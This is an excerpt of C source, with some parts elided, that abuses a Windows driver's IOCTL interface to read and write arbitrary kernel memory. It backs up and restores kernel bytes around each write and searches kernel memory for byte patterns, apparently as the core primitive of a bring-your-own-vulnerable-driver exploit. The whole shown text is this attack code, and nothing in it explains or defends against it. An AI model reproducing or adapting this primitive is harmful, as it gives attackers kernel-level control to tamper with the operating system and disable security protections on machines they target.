...
VOID DriverMemoryOperation(
    PVOID fromAddress,    // Source ptr (for writes) or buffer (for reads)
    PVOID toAddress,      // Target ptr (kernel address)
    size_t len,           // Length
    MEMORY_OPERATION opType)
{
    ...
    if (opType == MEMORY_READ)
    {
        // Read operation: fromAddress is buffer, toAddress is kernel address
        if (len <= 8)
        {
            UINT64 read_data[4] = { 0, (UINT64)toAddress, 0, 0 };
            UINT64 read_response[4] = { 0 };

            success = DeviceIoControl(hDevice, READ_IOCTL_CODE, read_data,
                sizeof(read_data), read_response, sizeof(read_response), &bytesRet, NULL);

            if (success && fromAddress)
            {
                *(UINT64*)fromAddress = read_response[3];
            }
        }
    }
    else if (opType == MEMORY_WRITE)
    {
        // Backup kernel memory before write
        if ((UINT64)toAddress > 0xFFFF000000000000)
        {
            ...
            if (pBackup)
            {
                ...
                if (success)
                {
                    // Copy backup data
                    if (len <= 8) {
                        *(UINT64*)pBackup = read_response[3];
                    } else {
                        Memcpy(pBackup, &read_response[3], len > 8 ? 8 : len);
                    }
        ...
        if (len <= 8)
        {
            UINT64 write_data[4] = { 0, (UINT64)toAddress, 0, *(UINT64*)fromAddress };
            UINT64 write_response[4] = { 0 };

            success = DeviceIoControl(hDevice, WRITE_IOCTL_CODE, write_data,
                sizeof(write_data), write_response, sizeof(write_response), &bytesRet, NULL);
        }
    }
    else if (opType == MEMORY_RESTORE)
    {
        // Restore operation - write data back
        if (len <= 8)
        {
            UINT64 write_data[4] = { 0, (UINT64)toAddress, 0, *(UINT64*)fromAddress };
            UINT64 write_response[4] = { 0 };
...
UINT64 CalculateOffset(UINT64 address, int startOffset, int count) {
    ...
    for (int i = count, k = 24; i > startOffset; i--, k -= 8) {
        UINT64 read_data[4] = { 0, (UINT64)(address + i), 0, 0 };
        UINT64 read_response[4] = { 0 };
        DWORD bytesRet = 0;

        HANDLE hDevice = GetContextHandle();
        BOOL success = DeviceIoControl(hDevice, READ_IOCTL_CODE, read_data,
            sizeof(read_data), read_response, sizeof(read_response), &bytesRet, NULL);

        if (success) {
            *buffer = (BYTE)(read_response[3] & 0xFF);
...
UINT64 FindPattern(UINT64 startAddress, const PATTERN_SEARCH* pattern, int maxCount) {
    ...
    while (count++ < maxCount) {
        ...
        UINT64 read_data[4] = { 0, currentAddr, 0, 0 };
        UINT64 read_response[4] = { 0 };
        DWORD bytesRet = 0;
        ...
        if (success) {
            // For small patterns, extract from response
            if (pattern->length <= 8) {
                Memcpy(buffer, &read_response[3], pattern->length);
